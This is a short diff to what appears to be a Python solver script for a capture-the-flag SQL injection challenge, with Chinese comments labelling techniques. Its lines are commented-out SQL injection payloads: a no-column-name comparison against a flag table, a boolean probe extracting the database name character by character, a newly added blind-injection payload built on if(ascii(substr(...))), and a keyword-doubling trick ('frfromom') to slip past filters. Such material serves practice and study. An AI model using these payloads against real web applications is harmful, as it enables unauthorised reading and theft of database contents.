@@ -38,7 +38,10 @@ def sql():
             # 无列名注入
             # payload = "1^1^((select 1,'{}') < (select * from f1ag_1s_h3r3_hhhhh))#".format(flag+chr(mid))
             # print(payload)
-            #1^1^(ascii(substr((select database()),1, 1))>1)
+            # 1^1^(ascii(substr((select database()),1, 1))>1)
+
+            # 盲注
+            # payload = "or if(ascii(substr(({}),{},1))>{},1,0)#".format(target, i, mid)
 
             # 字符替换
             # payload = payload.replace('from', 'frfromom')
